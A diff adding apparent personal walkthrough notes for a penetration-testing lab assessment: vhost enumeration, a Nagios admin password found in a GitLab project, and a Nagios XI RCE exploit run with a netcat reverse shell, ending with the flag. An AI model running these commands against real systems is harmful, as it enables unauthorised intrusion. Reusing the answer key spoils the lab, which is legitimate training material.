@@ -1,1 +1,54 @@
+During an external penetration test for the company Inlanefreight, you come across a host that, at first glance, does not seem extremely interesting. At this point in the assessment, you have exhausted all options and hit several dead ends. Looking back through your enumeration notes, something catches your eye about this particular host. You also see a note that you don't recall about the gitlab.inlanefreight.local vhost.
+
+Performing deeper and iterative enumeration reveals several serious flaws. Enumerate the target carefully and answer all the questions below to complete the second part of the skills assessment.
+
+
+
+CHALLENGE: 10.129.201.90
+
+vHosts needed for these questions:
+gitlab.inlanefreight.local
+
+Question 1 -  What is the URL of the WordPress instance? -> http://blog.inlanefreight.local
+1) add gitlab.inlanefreight.local to /etc/hosts 
+2) gobuster vhost -u inlanefreight.local -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q
+3) find 3 vhosts -> 
+Found: monitoring.inlanefreight.local (Status: 302) [Size: 27]
+Found: blog.inlanefreight.local (Status: 200) [Size: 50119]   
+Found: gitlab.inlanefreight.local (Status: 301) [Size: 339] 
+4) add all of these to /etc/hosts
+
+
+Question 2 - What is the name of the public GitLab project? - Virtualhost 
+1) http://gitlab.inlanefreight.local:
+2) register dummy account 
+3) once signed in, Projects tab -> explore projects -> Virtualhost 
+
+Question 3 - What is the FQDN of the third vhost? - monitoring.inlanefreight.local  
+1) from number 1 we see its monitoring.inlanefreight.local 
+
+
+Question 4 - What application is running on this third vhost? (One word)
+1) http://monitoring.inlanefreight.local 
+2) top left we see its Nagios 
+
+Question 5 -  What is the admin password to access this application?
+1) go back to gitlab.inlanefreight.local 
+2) go to the Nagios Postgres project
+3) click on the Update INSTALL with master password 
+4) postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&^lC';
+nagiosadmin:oilaKglm7M09@CPL&^lC
+
+Question 6 - Obtain reverse shell access on the target and submit the contents of the flag.txt file.
+1) login to monitoring.inlanefreight.lcoal with creds found in last question 
+2) we see at bottom left hand its running nagios XI 5.7.5 
+3) searchsploit nagios 5.7
+4) we find a 5.7.X RCE -> searchsploit -m php/webapps/49422.py
+5) nc listener in the same terminal tab and background it (attaining a job ): 
+6) nc -nlvp 4444 & 
+7) python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.15.252 4444 &
+8) once we connect background shell + job ID from number 6 so for us it was -> fg 1 
+9) enumerate til we find flag
+10) cat f5088a862528cbb16b4e253f1809882c_flag.txt
+afe377683dce373ec2bf7eaf1e0107eb
 
